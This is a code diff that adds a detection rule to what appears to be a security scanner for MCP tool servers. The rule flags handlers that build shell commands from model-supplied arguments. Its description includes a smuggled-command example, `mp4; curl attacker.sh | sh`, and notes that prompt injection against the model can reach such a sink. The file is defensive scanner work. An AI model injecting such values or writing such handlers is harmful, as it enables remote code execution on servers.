@@ -101,6 +101,7 @@ _AICM_TAGS: dict[str, list[str]] = {
     "AAK-SK-INMEMORY-VECTORSTORE-FILTER-CVE-2026-26030-PIN-001": ["AIS-08", "STA-08", "IVS-04"],
     "AAK-MCPCALC-CVE-2026-44717-PIN-001": ["AIS-08", "STA-08", "IVS-04"],
     "AAK-MCP-TOOL-UNSAFE-EVAL-001": ["AIS-08", "IVS-04"],
+    "AAK-MCP-TOOL-ARG-OSCMD-001": ["AIS-08", "IVS-04"],
     "AAK-METIS-REFUSAL-REFEED-001": ["AIS-07", "AIS-12"],
     "AAK-MCP-LINEAGE-STAINLESS-001": ["STA-02", "STA-08"],
     "AAK-SKILL-LIFECYCLE-ATTRIBUTION-001": ["LOG-06", "AIS-12"],
@@ -5078,6 +5079,47 @@ _r(
     owasp_mcp_references=["MCP01:2025", "MCP05:2025"],
     owasp_agentic_references=["ASI02", "ASI05"],
     incident_references=["NVD-CVE-2026-44717"],
+)
+
+_r(
+    "AAK-MCP-TOOL-ARG-OSCMD-001",
+    "Tool handler passes a model-supplied argument into an OS command",
+    "An MCP tool handler builds a shell command string out of a value that "
+    "arrives in the tool-call arguments object, then hands that string to a "
+    "process API — `child_process.exec` / `execSync`, or `spawn` / `execFile` "
+    "with `shell: true`. Because the string is composed at the call site "
+    "(a template literal with `${...}`, or a concatenation) the argument is "
+    "parsed by a shell, so a value such as `mp4; curl attacker.sh | sh` runs "
+    "as a second command. This is the shape of CVE-2026-78430 "
+    "(`mcp-ffmpeg-helper` 0.1.0 / 0.1.1 / 0.2.1, `handleToolCall` in "
+    "`src/tools/handlers.ts`, CWE-77/CWE-78), which carries a CVSS 3.1 base "
+    "of only 5.3 because the vector requires a local attacker — but in an "
+    "agent pipeline the local caller IS the model, and any upstream prompt "
+    "injection reaches this sink with the server's own privileges, which is "
+    "why this rule is CRITICAL rather than MEDIUM. The surface is the "
+    "handler, not the launcher: `AAK-MCP-002` and the "
+    "`AAK-MCP-STDIO-CMD-INJ-*` family inspect the configured server command "
+    "before the process starts, whereas this fires on the request path. "
+    "Detection is a TypeScript/JavaScript source pattern and is deliberately "
+    "narrower than `AAK-TAINT-001`, which reports any `child_process` call in "
+    "an MCP file without checking how the command was built; where this rule "
+    "fires, that one is suppressed on the same line so one defect is reported "
+    "once.",
+    Severity.CRITICAL,
+    Category.TOOL_POISONING,
+    "Pass arguments as an argv array to the process API and never as a "
+    "composed shell string: `execFile('ffmpeg', ['-i', input, '-f', format])` "
+    "rather than `exec(`ffmpeg -i ${input} -f ${format}`)`, and leave "
+    "`shell` unset (it defaults to false). Validate the argument against an "
+    "allowlist of expected values before it reaches the process boundary — "
+    "for a codec or container format that is a fixed, short list, so an "
+    "allowlist is exact rather than a filter that has to anticipate every "
+    "metacharacter.",
+    sarif_name="McpToolArgOsCommand",
+    cve_references=["CVE-2026-78430"],
+    owasp_mcp_references=["MCP04:2025"],
+    owasp_agentic_references=["ASI05"],
+    adversa_references=["ADV-INJECT-04"],
 )
 
 _r(
